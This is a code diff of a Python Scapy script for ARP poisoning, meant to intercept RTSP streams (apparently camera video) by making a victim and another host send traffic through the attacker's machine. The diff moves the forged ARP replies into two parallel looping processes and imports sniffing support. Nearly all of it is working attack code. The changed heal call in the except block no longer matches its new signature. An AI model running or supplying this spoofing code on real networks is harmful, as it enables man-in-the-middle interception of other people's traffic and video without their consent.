@@ -1,20 +1,21 @@
 # Scapy ARP poisoning to intercept RTSP packets
 
-from scapy.all import ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, send
+from multiprocessing import Process
+from scapy.all import Ether, ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, sendp, sniff
 import time
 import sys
 import os
 
 
-def poison(target_ip, target_mac, source_ip):
+def poison(iface, target_ip, target_mac, source_ip):
     packet = ARP(op=2, psrc=source_ip, pdst=target_ip, hwdst=target_mac)
-    send(packet, verbose=False)
+    sendp(packet, iface=iface, inter=1, loop=1)
 
 
-def heal(target_ip, target_mac, source_ip, source_mac):
+def heal(iface, target_ip, target_mac, source_ip, source_mac):
     packet = ARP(op=2, psrc=source_ip, hwsrc=source_mac,
                  pdst=target_ip, hwdst=target_mac)
-    send(packet, verbose=False)
+    sendp(packet, iface=iface)
 
 
 if __name__ == "__main__":
@@ -34,12 +35,16 @@ if __name__ == "__main__":
     attacker_ip = get_if_addr(attacker_iface)
     attacker_mac = get_if_hwaddr(attacker_iface)
 
+    def poison_victim():
+        poison(attacker_iface, victim_ip, victim_mac, spoof_ip)
+
+    def poison_spoof():
+        poison(attacker_iface, spoof_ip, spoof_mac, victim_ip)
+
     try:
-        while True:
-            print("Poisoning ARP table...")
-            poison(spoof_ip, spoof_mac, victim_ip)
-            poison(victim_ip, victim_mac, spoof_ip)
-            time.sleep(2)
+        print("Poisoning ARP table...")
+        Process(target=poison_victim).start()
+        Process(target=poison_spoof).start()
     except:
         print("Healing ARP table...")
         heal(victim_ip, victim_mac, spoof_ip, spoof_mac)
